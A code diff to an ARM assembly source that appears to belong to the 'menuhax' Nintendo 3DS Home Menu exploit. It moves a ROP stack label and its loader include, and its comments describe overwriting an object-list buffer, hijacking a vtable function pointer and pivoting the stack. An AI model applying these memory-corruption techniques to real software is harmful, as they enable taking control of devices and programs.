@@ -12,9 +12,6 @@ _start:
 .fill (((_start + 0x8 + ((360-TOTAL_HAX_ICONS)*8)) - .) / 4), 4, 0xffffffff
 .word ROPBUFLOC(object), 0x55667788 @ These two words(as a "titleID") overwrite the target_objectslist_buffer. The rest of the "titleIDs" here aren't used by Home Menu due to the s16 values below. This buffer contains a list of object-ptrs which gets used with a vtable-funcptr +16 call. This jumps to ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR. These objects are used by the main-thread, while the vulnerable function parsing this icon data runs on a seperate thread.
 
-ropstackstart:
-#include "menuhax_loader.s"
-
 object:
 .word ROPBUFLOC(vtable) @ object+0, vtable ptr.
 .word 0
@@ -40,6 +37,9 @@ stackpivot_pcloadword:
 @ objptr loaded by ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR.
 //.space ((object + 0x34) - .)
 .word ROPBUFLOC(object)
+
+ropstackstart:
+#include "menuhax_loader.s"
 
 @ Pad to the end of the titleID array, to make sure the above data doesn't get too large.
 .space ((_start + 0xb48) - .)
